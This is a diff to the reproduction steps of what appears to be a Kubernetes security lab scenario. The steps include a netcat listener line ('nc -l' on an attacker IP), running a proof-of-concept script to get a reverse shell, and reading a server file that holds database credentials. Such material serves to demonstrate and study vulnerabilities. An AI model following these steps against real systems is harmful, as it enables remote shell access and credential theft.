@@ -11,8 +11,8 @@ Used PoCs:
 ### Steps to Reproduce
 
 1- `minikube start` \
-2- `kubectl apply -f scenario-1-server.yaml` \
-3- Forward port `kubectl port-forward pods/scenario-1-server-deployment-c9b7c56cf-ggvgm 4242:4242` \
+2- Use `kubectl apply -f <filename>` for all of the .yaml files in kube folder \
+3- Forward port `kubectl port-forward pods/scenario-2-server-deployment-.... 4242:4242` \
 4- Listen on port `1234` and your ip for TCP connections like `nc -l 144.122.139.40 1234` \
 5- Run poc.py with your ip `./poc.py 144.122.139.40` \
 6- Attacker runs `ls` and sees a file named `server.js` which includes database hostname, username, password, database name and important table called `person`
